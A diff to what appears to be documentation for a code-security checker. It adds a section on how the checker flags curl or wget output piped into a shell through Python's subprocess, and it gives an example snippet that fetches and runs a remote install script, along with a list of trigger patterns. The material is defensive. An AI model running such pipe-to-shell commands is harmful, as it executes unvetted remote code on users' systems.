@@ -169,6 +169,30 @@ result = client.verify_code(code, check_security=True)
 # Issues: ["Command injection vulnerability"]
 ```
 
+### Remote code execution (pipe-to-shell)
+
+The Code Engine detects `curl` or `wget` commands piped into a shell through `subprocess`. Both regex-based and AST-based checks are used, so the detection works even when the call spans multiple lines or uses f-strings.
+
+```python
+code = '''
+import subprocess
+subprocess.run("curl http://example.com/install.sh | bash", shell=True)
+'''
+
+result = client.verify_code(code, check_security=True)
+# Issues: [{"type": "remote_code_execution", "severity": "CRITICAL"}]
+```
+
+Patterns that trigger this detection include:
+
+- `subprocess.run("curl ... | bash", shell=True)` — direct shell execution
+- `subprocess.Popen(["wget", "...", "|", "sh"])` — list-form invocation with pipe operators
+- Multi-line `subprocess.call(...)` with `curl`/`wget` and `bash`/`sh` in the command string
+
+<Note>
+This check covers `subprocess.run`, `subprocess.call`, `subprocess.Popen`, and `subprocess.check_output`. The AST-based analysis catches patterns that span multiple lines or use dynamic string construction, such as f-strings.
+</Note>
+
 ---
 
 ## Complexity Analysis
